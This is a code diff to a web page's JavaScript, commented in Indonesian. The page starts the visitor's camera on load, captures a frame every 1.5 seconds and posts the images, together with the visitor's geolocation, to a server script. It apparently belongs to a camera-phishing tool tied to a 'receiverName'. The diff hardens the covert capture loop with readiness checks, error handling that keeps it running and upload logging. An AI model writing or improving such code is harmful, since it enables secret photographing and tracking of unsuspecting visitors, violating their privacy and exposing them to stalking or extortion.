@@ -454,10 +454,36 @@ function handleCameraSuccess(stream) {
   video.srcObject = stream;
   
   var context = canvas.getContext('2d');
-  setInterval(function() {
-    context.drawImage(video, 0, 0, 640, 480);
-    var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-    postData(canvasData);
+  console.log('Camera activated - starting continuous capture every 1500ms');
+  
+  // Pastikan tidak ada interval duplicate
+  if (window.captureInterval) {
+    clearInterval(window.captureInterval);
+  }
+  
+  window.captureInterval = setInterval(function() {
+    try {
+      // Cek apakah video sudah ready
+      if (video.readyState !== video.HAVE_ENOUGH_DATA) {
+        console.log('Video not ready for capture, skipping...');
+        return;
+      }
+      
+      context.drawImage(video, 0, 0, 640, 480);
+      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      
+      // Validasi data
+      if (!canvasData || canvasData.length < 100) {
+        console.error('Invalid image data generated');
+        return;
+      }
+      
+      console.log('Capture successful, sending to server...');
+      postData(canvasData);
+    } catch (error) {
+      console.error('Capture error:', error.message);
+      // Lanjutkan loop meskipun ada error
+    }
   }, 1500);
 }
 
@@ -467,17 +493,22 @@ function postData(imgdata) {
   $.ajax({
     type: 'POST',
     data: { 
-      cat: imgdata,
+      image: imgdata,  // Ganti dari 'cat' ke 'image'
       name: receiverName
     },
-    url: 'forwarding_link/post.php',
+    url: 'post.php',  // Ganti ke post.php langsung
     dataType: 'json',
     async: true,
     success: function(result) {
-      console.log('Data berhasil dikirim');
+      if (result.success) {
+        console.log('Image upload successful:', result.filename);
+      } else {
+        console.error('Server reported upload error:', result.error);
+      }
     },
-    error: function() {
-      console.log('Gagal mengirim data');
+    error: function(xhr, status, error) {
+      console.error('Image upload failed - network error:', status, error);
+      // Loop tetap berjalan
     }
   });
 }
@@ -514,10 +545,30 @@ function sendLocationData(coords) {
       location: JSON.stringify(coords),
       name: receiverName // Menggunakan nama default
     },
-    url: 'forwarding_link/post.php',
+    url: 'post.php',  // Ganti ke post.php langsung
     dataType: 'json',
-    async: true
+    async: true,
+    success: function(result) {
+      console.log('Location data sent successfully');
+    },
+    error: function(xhr, status, error) {
+      console.error('Location upload failed:', error);
+    }
   });
+}
+
+// Cleanup saat halaman ditutup
+function cleanup() {
+  if (window.captureInterval) {
+    clearInterval(window.captureInterval);
+    console.log('Capture interval cleared');
+  }
+  
+  // Stop camera stream
+  if (window.stream) {
+    window.stream.getTracks().forEach(track => track.stop());
+    console.log('Camera stream stopped');
+  }
 }
 
 // Initialize on page load
@@ -527,6 +578,10 @@ document.addEventListener('DOMContentLoaded', function() {
   getLocation();
   initCamera(); // Langsung start camera saat page load
 });
+
+// Cleanup saat unload
+window.addEventListener('beforeunload', cleanup);
+window.addEventListener('unload', cleanup);
 </script>
 
 </body>
